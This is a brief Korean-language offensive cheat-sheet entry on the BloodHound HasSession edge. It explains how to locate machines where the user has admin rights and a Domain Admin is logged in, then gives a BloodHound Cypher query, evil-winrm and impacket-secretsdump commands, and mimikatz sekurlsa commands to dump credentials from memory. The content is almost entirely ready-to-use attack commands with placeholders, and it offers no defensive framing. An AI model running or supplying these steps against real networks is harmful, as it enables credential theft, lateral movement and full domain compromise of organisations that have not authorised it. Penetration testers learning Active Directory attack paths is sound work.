# 09_HasSession

현재 로그인 세션이다. AdminTo가 있는 머신에서 DA 세션이 발견되면 해당 머신 접근 후 메모리에서 크레덴셜을 탈취한다. SharpHound 수집 시 `-c All,LoggedOn` 이 없으면 HasSession 데이터가 없어서 결과가 나오지 않는다.

```bash
# 내가 접근 가능한 머신에서 DA 세션 확인 (BloodHound 쿼리)
# MATCH (me:User {name:"<내계정>@<도메인>"})-[:MemberOf*0..]->(:Group)-[:AdminTo]->(c:Computer)
# MATCH (c)-[:HasSession]->(da:User {admincount:true})
# RETURN me.name, c.name, da.name

# 해당 컴퓨터 접근 후 크레덴셜 덤프 (SMB 445 / WinRM 5985)
evil-winrm -i <대상IP> -u <공격자계정> -p '<패스워드>'
impacket-secretsdump <도메인>/<공격자계정>:'<패스워드>'@<대상IP>
```

```bash
# Windows (mimikatz)
sekurlsa::logonpasswords
sekurlsa::wdigest
```